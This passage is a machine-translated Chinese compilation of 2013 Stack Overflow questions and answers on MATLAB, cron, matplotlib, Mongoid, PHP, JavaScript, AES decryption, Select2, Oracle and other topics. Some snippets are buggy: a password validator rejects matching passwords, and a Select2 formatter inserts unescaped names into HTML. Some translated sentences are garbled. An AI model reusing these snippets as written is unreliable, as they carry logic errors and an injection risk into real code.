我使用*mex -setup*来设置我的编译器和*Microsoft Windows SDK v7.1*。有趣的是，虽然我在我的系统上安装了它们，但 MATLAB 看不到 MS Visual Studio C++ 2008**或**2010。我还尝试使用*Lcc-win32 C 2.4.1*编译器（*MATLAB*识别）进行编译，结果相同效果如上图。

我知道这组特定的 C++ 源文件*可能*需要一些名为[liblo](http://plugin.org.uk/liblo/)的东西来编译（我不确定这是编译时还是运行时的要求）；据我所知，我已经正确安装了这些，但问题也可能出在此处。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:38:31.393

尝试将`.c`文件重命名为`.cpp`并重新编译

```
>> mex -largeArrayDims -O osc_free_address.cpp 
```

此外，您为什么不尝试软件包附带的 build m 文件（如[this question](https://stackoverflow.com/questions/14789656/linking-matlab-to-a-dll-library)中所建议的那样）？

你有没有下载并编译过liblo？您可能需要在`mex`命令中为其添加包含路径和库路径？

```
>> mex -largeArrayDims -O -I<liblo include path> -L<liblo lib path> -llo osc_free_address.cpp 
```

# tomcat - 用于了解 Tomcat 中的类加载器加载了哪些类的实用程序

> ID：14853605
> 
> 赞同：1
> 
> 时间：2013-02-13T12:29:21.397
> 
> 标签：tomcat, classloader, classnotfoundexception

我有一个 web 应用程序，在 plugins 目录下有一些 jars

> **例如：tomcat/webapps/sampleApp/WEB-INF/plugins**

`ClassNotFoundException`我的 Tomcat 服务器正在为这些课程扔东西。请让我知道如何让 tomcat 知道加载这些类。

还有任何工具可以显示Linux机器中tomcat服务器的类加载器加载的类列表。

# linux - 意外的 EOF cronjob 错误

> ID：14853620
> 
> 赞同：2
> 
> 时间：2013-02-13T12:30:08.970
> 
> 标签：linux, bash, cron, crontab

我有以下 cronjob：

```
2 15 * * * mysqldump -u user -ppass dbname | gzip -9  -c > /var/www/backup/dump-$(date +%Y-%m-%d).sql.gz 
```

但它会产生以下错误：

`/bin/sh: -c: line 0: unexpected EOF while looking for matching ')'
/bin/sh: -c: line 1: syntax error: unexpected end of file`

我尝试省略`-c`但没有运气。我的 crontab 中还有一行，但我认为它不相关：

```
0 0 * * * find /var/www/backup/* -mtime +15 -exec rm {} \; 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:30:48.007

该`%`字符应在`cron`.

所以，

```
2 15 * * * mysqldump -u user -ppass dbname | gzip -9  -c > /var/www/backup/dump-$(date +\%Y-\%m-\%d).sql.gz 
```

# python - 将坐标绘制为矩阵 matplotlib python

> ID：14853623
> 
> 赞同：3
> 
> 时间：2013-02-13T12:30:11.913
> 
> 标签：python, matplotlib, wxpython

我有一组坐标，说`[(2,3),(45,4),(3,65)]` 我需要将它们绘制为矩阵无论如何我可以在 matplotlib 中执行此操作，所以我希望它具有这种外观[http://imgur.com/Q6LLhmk](http://imgur.com/Q6LLhmk)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:51:09.717

编辑：我原来的答案使用`ax.scatter`. 这样做有一个问题：如果两个点并排，`ax.scatter`可能会在它们之间画出一点空间，具体取决于比例：

例如，与

```
data = np.array([(2,3),(3,3)]) 
```

这是放大的细节：

![在此处输入图像描述](../Images/3555bcd8e2bc1516d5cfaa917f587872.png)

因此，这是解决此问题的替代解决方案：

```
import matplotlib.pyplot as plt
import numpy as np

data = np.array([(2,3),(3,3),(45,4),(3,65)])
N = data.max() + 5

# color the background white (1 is white)
arr = np.ones((N,N), dtype = 'bool')
# color the dots black (0)
arr[data[:,1], data[:,0]] = 0

fig = plt.figure()
ax = fig.add_subplot(1, 1, 1)

ax.imshow(arr, interpolation='nearest', cmap = 'gray')
ax.invert_yaxis()
# ax.axis('off')
plt.show() 
```

![在此处输入图像描述](../Images/76e0e5504cd0d89df977f6bd31a3ce30.png)

无论您放大多少，(2,3) 和 (3,3) 处的相邻方块都将保持并排。

不幸的是，与 using 不同`ax.scatter`， using`ax.imshow`需要构建一个`N x N`数组，因此它可能比 using 更占用内存`ax.scatter`。`data`但是，除非包含非常大的数字，否则这应该不是问题。

# ruby-on-rails - 具有父引用的 Mongoid 为空

> ID：14853629
> 
> 赞同：2
> 
> 时间：2013-02-13T12:30:26.613
> 
> 标签：ruby-on-rails, ruby-on-rails-3, mongodb, mongoid, parent-child

我正在尝试使用 Mongoid[使用父引用来创建模型树结构](http://docs.mongodb.org/manual/tutorial/model-tree-structures-with-parent-references/)
， 但**父级设置为 null**。

这是我的课：

```
class Category
  include Mongoid::Document
  field :name, type: String
  belongs_to :parent, :class_name => 'Category'
end 
```

这就是我创建类别的方式：

```
parent = Category.new(name: "Mobile").save!
child1 = Category.new(name: "Android", parent: parent).save!
child2 = Category.new(name: "iOS", parent: parent).save! 
```

结果：

```
{ 
    "categories": [
        {
            "_id": "511b84c5cff53e03c6000126",
            "name": "Mobile",
            "parent_id": null,
        },
        {
            "_id": "511b84c5cff53e03c6000128",
            "name": "Android",
            "parent_id": null,
        },
        {
            "_id": "511b84c5cff53e03c6000129",
            "name": "iOS",
            "parent_id": null,
        }
    ]
} 
```

父级甚至没有存储在数据库中：

```
{ "name" : "Mobile",  "_id" : "511b84c5cff53e03c6000126" }
{ "name" : "Android", "_id" : "511b84c5cff53e03c6000128" }
{ "name" : "iOS",     "_id" : "511b84c5cff53e03c6000129" } 
```

做错了什么？

谢谢！
荣

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T14:15:37.947

除了声明`belongs_to`关联之外，您还需要声明相反的`has_many`关联，即使它在同一个类上。

```
class Category
  include Mongoid::Document
  field :name, type: String

  has_many :children,
    class_name: 'Category',
    inverse_of: :parent
  belongs_to :parent,
    class_name: 'Category',
    inverse_of: :children
end 
```

您可以通过关联分配父级或子级。

```
parent = Category.create
child1 = Category.create
child2 = Category.create

parent.children << child1
parent.children << child2 
```

然后，子代将存储对父代的引用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-14T08:38:55.440

最终，当我单独进行保存（而不是与创建在同一行）时，它起作用了。

之前（无法正常工作）：

```
parent = Category.new(name: "Mobile").save!
child1 = Category.new(name: "Android", parent: parent).save!
child2 = Category.new(name: "iOS", parent: parent).save! 
```

之后（工作！）：

```
parent = Category.new(name: "Mobile")
child1 = Category.new(name: "Android", parent: parent)
child2 = Category.new(name: "iOS", parent: parent)

parent.save
child1.save
child2.save 
```

结果（如预期）：

```
{ "name" : "Mobile", "_id" : "511b84c5cff53e03c6000126" }
{ "name" : "Android", "parent_id" : "511b84c5cff53e03c6000126", "_id" : "511b84c5cff53e03c6000128" }
{ "name" : "iOS", "parent_id" : "511b84c5cff53e03c6000126", "_id" : "511b84c5cff53e03c6000129" } 
```

非常感谢所有响应者！

# php - 跨类参数

> ID：14853631
> 
> 赞同：0
> 
> 时间：2013-02-13T12:30:28.277
> 
> 标签：php, variables, object

我在 2 个不同的文件中有这 2 个类

```
class Foo {      
  public $type = int;    
  function __construct($out = 1) {        
    $this->type=$out;    
  }

  public function get() {    
    return $this->type;    
  }    
} 
```

和

```
class bar {    
  function __construct {    
    echo $foo->get();    
  }    
} 
```

也许是一个愚蠢的问题，但为什么这不起作用？在上面的 index.php 文件中我有

```
 $vFoo = new Foo(15);
 $vBar = new Bar(); 
```

我虽然那个酒吧会呼应 Foo 的类型..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:34:17.107

您的代码中没有任何`$foo`变量，如果是，它将超出范围。类不是对象，[学习基础知识](http://www.php.net/manual/en/language.oop5.basic.php)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:47:24.297

可能你想要的是：

```
class bar {

  function __construct($foo) {

    echo $foo->get();

  }

} 
```

然后在 index.php 中：

```
$vFoo = new Foo(15); $vBar = new Bar($vFoo); 
```

但你真正需要的不是解决方案——而是[学习基础知识](http://www.php.net/manual/en/language.oop5.basic.php)。您似乎不了解对象是什么以及它与类的关系（这就是您的问题所暗示的；我相信您不相信）。

# c# - 在 Visual Studio 2010 中从源代码构建 selenium（错误）

> ID：14853634
> 
> 赞同：2
> 
> 时间：2013-02-13T12:30:33.480
> 
> 标签：c#, selenium, automation, browser

我正在尝试使用 Visual Studio 2010 构建 Selenium 的源代码。以下是我执行的步骤：

[1 从http://selenium.googlecode.com/svn/trunk/](http://selenium.googlecode.com/svn/trunk/)下载整个源代码

2 执行 go bat 文件（等待大约 3-4 分钟完成，没有错误）

3 打开WebDriver.sln

当我尝试编译解决方案时，出现此错误：

> “错误 1 ​​错误 C3861：找不到‘__stosb’标识符 C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\include\winnt.h 13074 1 webdriver-firefox-latest”

大量其他相同的错误（在不同的行）。问题是什么？

在此先感谢，弗拉德

# javascript - 验证密码

> ID：14853639
> 
> 赞同：0
> 
> 时间：2013-02-13T12:30:49.737
> 
> 标签：javascript, validation, passwords

我正在尝试使用javascript验证密码，这是为了确保在更改密码时，输入的新密码等于重新输入新密码的密码（用户被要求输入两次新密码，所以两者必须匹配）但同时，我想确保新密码至少有6个字符长，我分别拥有这些功能但不知道如何组合它们......提前感谢您的帮助！

这是我到目前为止所拥有的......

这是为了确保新密码匹配：

```
function validatePassword()
    {
     var new_password = document.getElementById("new_password").value;
     var confirm_new_password = document.getElementById("confirm_new_password").value;
     <!-- if they match, go to next page -->
        if ( new_password == confirm_new_password)
          {
             return true;
          }
     <!-- if they don't match, an error message is displayed -->
        else
          {
               alert("Passwords do not match.");
          }
             return false;
    } 
```

这是密码长度：

```
 function validatePassword()
    {
    if (document.getElementById("new_password").value.length < "5")
    {
    <!--If pasword is less than 5 characters long, display error message-->
    alert("Please ensure your password is at least 6 characters long.");
    return false;
    }
    return true;
    } 
```

我如何将这两者结合起来形成一个单一功能，在其中检查两个新密码以使其匹配，并检查它们是否超过 6 个字符？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:37:22.663

要结合您的两个功能，这将起作用：

```
function validatePassword()
{
     var new_password = document.getElementById("new_password").value;
     var confirm_new_password = document.getElementById("confirm_new_password").value;

     if (new_password.length < 5)
     {
         <!--If pasword is less than 5 characters long, display error message-->
         alert("Please ensure your password is at least 6 characters long.");
         return false;
     }
     else if ( new_password != confirm_new_password)
     {
         alert("Passwords do not match.");
         return false;
     }
     else
     {
          return true;
     }
 } 
```

虽然我同意，但那里有更好的程序。请确保您也在进行服务器端验证，因为客户端验证很容易跳过。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:33:46.350

我不确定，但你可以`validatePassword()`在里面调用这个函数

```
if ( new_password == confirm_new_password)
{
    validatePassword();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:35:21.710

您有两个选择，要么将这两个函数设为一个函数，要么将它们设为两个单独的函数并在提交/处理表单之前调用它们。

```
if (validatePasswordLength() && validatePasswordsMatch()) {
    // Continue
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T12:46:49.940

你必须尝试这个小而有效的代码。

```
if(document.getElementById("new_password").value != document.getElementById("confirm_new_password").value){
     alert("Passwords do not match.");
    return false;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:49:27.147

```
<script>
function validatePassword()
    {
     var new_password = document.getElementById("new_password").value;
     var confirm_new_password = document.getElementById("confirm_new_password").value;

    if (document.getElementById("new_password").value.length < "5")
    {
    alert("Please ensure your password is at least 6 characters long.");
    return false;
    }
     if (new_password == confirm_new_password)
     {
           alert("Password no match");
           return false;
     }
     return true;
    }
</script>
<form action="" onsubmit="return validatePassword()">
<p>New Password: <input type="password" id="new_password" name="new_password" /></p>
<p>Confirm Password: <input type="password" id="confirm_new_password" name="confirm_new_password" /></p>
<p><input type="submit" value="submit" /></p>
</form> 
```

# php - C# 到 PHP AES 解密

> ID：14853641
> 
> 赞同：1
> 
> 时间：2013-02-13T12:30:54.147
> 
> 标签：php, encryption, aes, rfc2898

嗨，我有 c# 代码示例，但我无法将其转换为 php。我试图重写代码，但我做不到。在我的项目中，其他服务器使用 c# 加密数据，我必须使用 PHP 对其进行解密。

我有密码和盐值。

这里是 C# 代码包括加密和解密功能。

```
using System;

using System.Collections.Generic;

using System.Linq;
using System.Text;
using System.Security.Cryptography;
using System.IO;

namespace EncryptionSample
{
    public static class CipherUtility
    {
        public static string Encrypt(string plainText, string password, string salt)
        {
            if (plainText == null || plainText.Length <= 0)
            {
                throw new ArgumentNullException("plainText");
            }

            if (String.IsNullOrEmpty(password))
            {
                throw new ArgumentNullException("password");
            }

            if (String.IsNullOrEmpty(salt))
            {
                throw new ArgumentNullException("salt");
            }

            byte[] encrypted;
            byte[] saltBytes = Encoding.UTF8.GetBytes(salt);

            using (Rfc2898DeriveBytes derivedBytes = new Rfc2898DeriveBytes(password, saltBytes))
            {
                using (AesCryptoServiceProvider aesAlg = new AesCryptoServiceProvider())
                {
                    aesAlg.Key = derivedBytes.GetBytes(32);
                    aesAlg.IV = derivedBytes.GetBytes(16);

                    ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                    using (MemoryStream msEncrypt = new MemoryStream())
                    {
                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                        {
                            using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                            {
                                swEncrypt.Write(plainText);
                            }

                            encrypted = msEncrypt.ToArray();
                        }
                    }
                }
            }

            return Convert.ToBase64String(encrypted);
        }

        public static string Decrypt(string cipherValue, string password, string salt)
        {
            byte[] cipherText = Convert.FromBase64String(cipherValue);

            if (cipherText == null 
                || cipherText.Length <= 0)
            {
                throw new ArgumentNullException("cipherValue");
            }

            if (String.IsNullOrWhiteSpace(password))
            {
                throw new ArgumentNullException("password");
            }

            if (String.IsNullOrWhiteSpace(password))
            {
                throw new ArgumentNullException("salt");
            }

            string plaintext = null;
            byte[] saltBytes = Encoding.UTF8.GetBytes(salt);

            using (Rfc2898DeriveBytes deriveBytes = new Rfc2898DeriveBytes(password, saltBytes))
            {
                using (AesCryptoServiceProvider aesAlg = new AesCryptoServiceProvider())
                {
                    aesAlg.Key = deriveBytes.GetBytes(32);
                    aesAlg.IV = deriveBytes.GetBytes(16);

                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                    using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {
                                plaintext = srDecrypt.ReadToEnd();
                            }
                        }
                    }
                }
            }

            return plaintext;
        }
    }
} 
```

我的 php 代码在这里，但我认为我完全错了。

```
function decrypt($encrypted, $password, $salt) {
 // Build a 256-bit $key which is a SHA256 hash of $salt and $password.
 $key = hash('SHA256', $salt . $password, true);
 // Retrieve $iv which is the first 22 characters plus ==, base64_decoded.
 $iv = base64_decode(substr($encrypted, 0, 22) . '==');
// print_r($iv);die();
 // Remove $iv from $encrypted.
 $encrypted = substr($encrypted, 22);
 //print_r($encrypted);die();
 // Decrypt the data.  rtrim won't corrupt the data because the last 32 characters are the md5 hash; thus any \0 character has to be padding.

 $decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, base64_decode($encrypted), MCRYPT_MODE_CBC, $iv), "\0\4");

 // Retrieve $hash which is the last 32 characters of $decrypted.
 $hash = substr($decrypted, -32);
 // Remove the last 32 characters from $decrypted.
 $decrypted = substr($decrypted, 0, -32);
 // Integrity check.  If this fails, either the data is corrupted, or the password/salt was incorrect.
 if (md5($decrypted) != $hash) return false;

 return $decrypted;
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T16:41:15.823

乍一看，我可以看到你的钥匙会有所不同。您的 C# 代码使用 生成您的密钥`Rfc2898DeriveBytes`，这是一个基于 PBKDF2 的密钥生成器。另一方面，您的 php 代码使用 SHA256 来生成密钥。这些将返回不同的值。使用不同的键，您甚至在开始之前就完成了。

另外，我不知道`CryptoStream`会在密文的开头附加 IV，也不知道在密文的末尾附加 MAC 值。如果完全解密，删除该文本将使您的纯文本出现乱码。请注意，在 C# 解密方法中，您基于密钥派生对象派生 IV（这并不聪明，因为相同的密钥将为每条消息生成相同的 IV，这会降低密文第一个块的安全性，但这是一个完全独立的问题）。

您是否知道 C# 服务器生成的密文与您的代码示例完全相同？您需要知道服务器端正在使用的密码学的确切参数

我建议您实际上尝试研究和理解 C# 将发出的密文格​​式，然后弄清楚如何在 PHP 中使用它。使用密码学可能非常棘手，尤其是在尝试集成异构系统时。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:36:45.763

我不是加密专家，但我认为您可能会发现[phpseclib](http://phpseclib.sourceforge.net/ "phpseclib")很有用。

# asp.net-mvc - 从 MVC 4 的数据库中填充 Select2 下拉框

> ID：14853643
> 
> 赞同：9
> 
> 时间：2013-02-13T12:31:11.673
> 
> 标签：asp.net-mvc, jquery, jquery-select2

我需要帮助编写 jquery/ajax 来填充[Select2](http://ivaynberg.github.io/select2/index.html)下拉框。

*对于那些不知道[Select2](http://ivaynberg.github.io/select2/index.html)是什么的人，它是一个 javascript 扩展，用于为 html 选择列表下拉框提供 Twitter Bootstrap 外观和搜索/提前输入功能。有关更多信息，请查看此处的示例：[Select2 Github 页面](http://ivaynberg.github.io/select2/index.html)*

* * *

**更新 - 解决了！**

* * *

所以我终于把这一切放在一起，我的问题的解决方案是我缺少格式化结果和列表选择的函数。下面的代码完美地生成了一个功能正常的[Select2](http://ivaynberg.github.io/select2/index.html) Dropbox。

控制器上的 Json 方法：

```
public JsonResult FetchItems(string query)
{
    DatabaseContext dbContext = new DatabaseContext(); //init dbContext
    List<Item> itemsList = dbContext.Items.ToList(); //fetch list of items from db table
    List<Item> resultsList = new List<Item>; //create empty results list
    foreach(var item in itemsList)
    {   
        //if any item contains the query string
        if (item.ItemName.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0) 
        {
            resultsList.Add(item); //then add item to the results list
        }
    }
    resultsList.Sort(delegate(Item c1, Item c2) { return c1.ItemName.CompareTo(c2.ItemName); }); //sort the results list alphabetically by ItemName
    var serialisedJson = from result in resultsList //serialise the results list into json
        select new
        {
            name = result.ItemName, //each json object will have 
            id = result.ItemID      //these two variables [name, id]
        };
    return Json(serialisedJson , JsonRequestBehavior.AllowGet); //return the serialised results list
} 
```

上面的 Json 控制器方法返回一个序列化的 Json 对象列表，其 ItemName 包含提供的字符串“查询”（此“查询”来自[Select2](http://ivaynberg.github.io/select2/index.html)下拉框中的搜索框）。

下面的代码是视图中的 Javascript（或您喜欢的布局），用于驱动[Select2](http://ivaynberg.github.io/select2/index.html)下拉框。

Javascript：

```
$("#hiddenHtmlInput").select2({
    initSelection: function (element, callback) {
        var elementText = "@ViewBag.currentItemName";
        callback({ "name": elementText });
    },
    placeholder: "Select an Item",
    allowClear: true,
    style: "display: inline-block",
    minimumInputLength: 2, //you can specify a min. query length to return results
    ajax:{
        cache: false,
        dataType: "json",
        type: "GET",
        url: "@Url.Action("JsonControllerMethod", "ControllerName")",
        data: function (searchTerm) {
            return { query: searchTerm };
        },
        results: function (data) { 
            return {results: data}; 
        }
    },
    formatResult: itemFormatResult,
    formatSelection: function(item){
        return item.name;
    }
    escapeMarkup: function (m) { return m; }
}); 
```

然后在视图的主体中，您需要一个隐藏的 Input 元素，[Select2](http://ivaynberg.github.io/select2/index.html)会将 Dropbox 呈现到该元素。

html:

```
<input id="hiddenHtmlInput" type="hidden" class="bigdrop" style="width: 30%" value=""/> 
```

或者将 MVC Razor html.hidden 元素附加到您的视图模型，以使您能够将选择的项目 Id 发布回服务器。

Html（MVC 剃刀）：

```
@Html.HiddenFor(m => m.ItemModel.ItemId, new { id = "hiddenHtmlInput", @class = "bigdrop", style = "width: 30%", placeholder = "Select an Item" }) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-14T14:00:48.617

解决了！最后。

完整的 jquery 如下所示，需要两个函数来格式化控制器返回的结果。这是因为 Dropbox 需要一些 html 标记来包裹结果，以便能够显示它们。

还需要 contractID 作为控制器中的属性，因为没有它的结果会显示在下拉列表中，但无法选择它们。

```
$("#contractName").select2({
    placeholder: "Type to find a Contract",
    allowClear: true,
    minimumInputLength: 2,
    ajax: {
        cache: false,
        dataType: "json",
        type: "GET",
        url: "@Url.Action("FetchContracts", "Leads")",
        data: function(searchTerm){
            return { query: searchTerm };
        },
        results: function(data){
            return { results: data };
        }
    },
    formatResult: contractFormatResult,
    formatSelection: contractFormatSelection,
    escapeMarkup: function (m) { return m; }
});

function contractFormatResult(contract) {
    var markup = "<table class='contract-result'><tr>";
    if (contract.name !== undefined) {
        markup += "<div class='contract-name'>" + contract.name + "</div>";
    }
    markup += "</td></tr></table>"
    return markup;
}

function contractFormatSelection(contract) {
    return contract.name;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T13:35:28.640

问题是您正在`List<Contract>`从该控制器方法返回 a，但 MVC 运行时不知道如何将其交给浏览器。您需要返回 a `JsonResult`：

```
public JsonResult FetchContracts() 
{
    TelemarketingContext teleContext = new TelemarketingContext();
    var contracts = teleContext.Contracts.ToList();
    var json = from contract in contracts 
        select new {
            name = contract.ContractName,
            id = contract.ContactID,
        };
    return Json(json, JsonRequestBehavior.AllowGet);
} 
```

现在，`data`AJAX : Success 函数的参数将是来自控制器的 JSON。我不熟悉这个插件是如何工作的，但`data`如果你需要的话，你应该能够手动循环遍历 json。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T14:55:18.363

选择 2 似乎是附加了 jquery 的标准选择，所以这应该可以工作：

模型：

```
 public class vmDropDown
  {
    public IEnumerable<SelectListItem> DeviceList { get; set; }
    [Required(ErrorMessage = "Please select at least one item")]
    public IEnumerable<int> SelectedItems { get; set; }
  } 
```

控制器：

```
 [HttpGet]
    public ActionResult Assign(int id)
    {
      return View(CreateUnassignedModel(id));
    }

[HttpPost]
public ActionResult Assign(vmDeviceAssign model)
{
  if (ModelState.IsValid)
  {
    _deviceLogic.Assign(model.GroupId, model.SelectedItems);
    return View("ConfirmDevice");
  }
  else // Validation error, so redisplay data entry form
  {
    return View(CreateUnassignedModel(model.GroupId));
  }
}

private vmDeviceAssign CreateUnassignedModel(int id)
{
  return new vmDeviceAssign
  {
    DeviceList = _deviceLogic.GetUnassigned(),
    SelectedItems = null
  };
} 
```

看法：

```
<div class="editor-field">
    @Html.ListBoxFor(model => model.SelectedItems, new SelectList(Model.DeviceList, "Value", "Text"))
    @Html.ValidationMessageFor(model => model.SelectedItems)
</div> 
```

上班时无法解释，但如果你留言，今晚我会捡起来

# android - 从 ViewFlipper 中的单选按钮中检索文本

> ID：14853645
> 
> 赞同：0
> 
> 时间：2013-02-13T12:31:21.590
> 
> 标签：android, radio-button, viewflipper, radio-group

我应该如何将所选单选按钮的文本放置在 viewFlipper 中......？我有一个 RadioGroup，其中我放置了所有单选按钮！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:35:05.347

您只需要使用 viewflipper.getDisplayedChild() 从 ViewFlipper 获取当前视图；然后是 radioButton.getText()。

# operating-system - 从 Linux 连接到 windows 而不注销 windows 上的当前用户

> ID：14853649
> 
> 赞同：0
> 
> 时间：2013-02-13T12:31:28.653
> 
> 标签：operating-system, remote-desktop, multi-user

我想要实现的是从 linux 登录到 Windows 机器，该机器已经被一个不应注销的用户使用，并且系统应该同时与这两个用户一起工作。我正在使用 krdc 连接到来自linux的windows机器，当其他用户登录时注销用户。有没有其他方法可以实现我的意图。

谢谢并恭祝安康

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:37:33.517

您需要安装**真正的**终端服务。通常可以启用窗口（家庭、专业等）以具有终端服务，但只能用于 1 个会话。如果您安装终端服务，您将需要为用户支付许可费用。

要允许多重连接，您应该使用 VNC/teamviewer（这是实现您想要的最简单的方法）。

# installation - 无法安装 antlrworks2

> ID：14853659
> 
> 赞同：1
> 
> 时间：2013-02-13T12:31:58.127
> 
> 标签：installation, antlrworks2

我从隧道视觉实验室网站下载了 antlrworks2 并尝试通过运行 antlrworks2.exe 来安装它，但收到错误“antlrworks2.exe 不是有效的 win32 应用程序”。我在 Win server 2003 和 Win 7 32 位上试过，但我得到了同样的错误。

我正在使用 VS 2008 进行开发，因为目标语言是 C#。

这是安装antlrworks的正确方法吗？我相信 antlrworks 是一个独立的应用程序，还是我还需要安装 antlr？它有任何依赖吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T15:45:59.153

我知道您描述的问题出现在 Windows XP 上的问题，但在 Windows Vista 或更高版本上没有听说过。该问题将在 ANTLRWorks 2.0.1 中得到修复。
[#7 支持在 Windows XP 上运行 ANTLRWorks 2](https://bitbucket.org/sharwell/antlrworks2/issue/7/support-running-antlrworks-2-on-windows-xp)

ANTLRWorks 2 要求您在运行之前安装 Java。我不确定它是否仅适用于安装的 JRE（仅限运行时），所以为了安全起见，我建议安装 JDK（开发工具包）。我推荐 Java 7，因为它具有性能优势；当前版本是 7u13。
[Java SE 开发工具包 7 下载](http://www.oracle.com/technetwork/java/javase/downloads/jdk7-downloads-1880260.html)

# jquery - 单选按钮不使用 jQuery 在 Firefox 中传递值

> ID：14853660
> 
> 赞同：2
> 
> 时间：2013-02-13T12:32:03.690
> 
> 标签：jquery, html, codeigniter, firefox

我有这个评论网站，有一个表格供用户输入他们的评论，例如：[http](http://www.thecrowder.com/index.php/userreviews/sites/99_Designs) ://www.thecrowder.com/index.php/userreviews/sites/99_Designs （点击“提交评论”）

我正在使用 jQuery[星级评分插件](http://www.fyneworks.com/jquery/star-rating/)，它在 Chrome 中运行良好。但是，Firefox 和 IE 存在一些问题 - 它无法识别正在发送的值，并且我收到“评级”变量丢失的错误。

如果我删除 jquery 中的“：checked”，我不会收到错误，但显然也会得到“0”作为评级。我应该为其他浏览器编写这个不同的方式吗？

评审表：

```
<table>
<tr>
    <td>Site reviewed:</td>
    <td><input readonly type="text" id="site" value="<?php echo ucwords($cleanSitename); ?>" class="required"></td>
    </tr>
    <tr>
        <td>Name:</td>
        <td> <input type="text" id="name" class="required" > </td>            
    </tr>
    <tr>
        <td>Review:</td>
        <td><textarea id="messageUser" class="required" ></textarea></td>
    </tr>
    <tr>
        <td>Rate this site:</td> <!--jquery star rating system -->
        <td class="required">
            <div>                       
                <input type="radio" value="1" class="star" name="rate"/>
                <input type="radio" value="2" class="star" name="rate"/>
                <input type="radio" value="3" class="star" name="rate"/>
                <input type="radio" value="4" class="star" name="rate"/>
                <input type="radio" value="5" class="star" name="rate"/>                               
            </div>
        </td>
    </tr>
</table>
<button id="submitReview2">Submit</button> 
```

jQuery：

```
$('#submitReview2').click(function() {
    var profile = $('#site').val();
    var name = $('#name').val();
    var message = $('#messageUser').val();
    var rating = $("input:radio[name=rate]:checked").val();
  } 
```

顺便说一句，如果有任何区别，我正在使用 codeigniter。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:49:05.663

试试这个来获得选中的星数：

```
var rating = $(".star-rating-control .star-rating-on").length; 
```

# debugging - dbx: 大小为 0 的内部警告可写内存段

> ID：14853661
> 
> 赞同：1
> 
> 时间：2013-02-13T12:32:05.180
> 
> 标签：debugging, solaris, core, coredump, dbx

尝试使用加载核心文件时`dbx`收到以下警告：

```
dbx: internal warning: writable memory segment 0xfa8b0000[16384] of size 0 in core 
```

似乎没有解释：

```
(dbx) help core 
```

这条消息是什么意思？

**编辑**

其余的输出：

```
core file header read successfully
Reading ld.so.1

dbx: internal error: signal SIGBUS (invalid address alignment)
dbx's coredump will appear in /tmp
Abort (core dumped) 
```

并且 dbx 在不加载核心的情况下退出。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-18T17:51:43.323

通过将 Solaris Studio 升级到 12.3 版并`dbx`从那里使用更新的版本来解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-01T13:29:10.187

发生这种情况的原因之一是因为 dbx 需要绝对路径来获取目标文件，请尝试给出

```
dbx <PATHTOBINARY>/binaryfile 
```

当然，您可以将 dbx 升级到最新版本来修复相同的问题。

# ruby-on-rails-3.2 - 使用 .each 查找时如何排除属性

> ID：14853664
> 
> 赞同：0
> 
> 时间：2013-02-13T12:32:14.053
> 
> 标签：ruby-on-rails-3.2

我尝试遍历这样的属性：

```
<% student.account.attributes.each do |value| %>
    <td><%= value %></td>
<% end %> 
```

没关系。但是，我怎样才能从循环中排除某些属性？我使用了一个类似 ['one', 'two', 'three'] 的数组，其中 'one'、'two' 和 'three' 是要排除的值（或者，如果这更容易 - 包括）。

**编辑：**

正如@Vysakh Sreenivasan 所建议的，我终于使用了这个：

```
<% exclude_keys = ['one', 'two', 'three'] %>
<% student.account.attributes.each do |key, value| %>
  <td><%= value unless exclude_keys.include? key %></td>
<% end %> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T14:20:24.997

如果 student.account.attributes 是一个数组

**单程**

```
<% student.account.attributes.each do |value| %>
<td><%= value unless ["one", "two", "three"].include? value %></td>
<% end %> 
```

**其他方式**

```
<% exclude_values = ["one" , "two", "three"] %>
<% (student.account.attributes - exclude_values).each do |value| %>
   <td> <%= value %> </td> 
<% end %> 
```

# oracle - Oracle 对某些用户隐藏列

> ID：14853667
> 
> 赞同：7
> 
> 时间：2013-02-13T12:32:22.457
> 
> 标签：oracle, security, privacy, tns

**场景**：Oracle 11g 数据库包含一些敏感的用户数据，如果泄露给错误的一方可能会导致法律责任。

**预期效果**：只有某个用户，从某个 IP 连接，才能看到包含此​​敏感用户数据的列

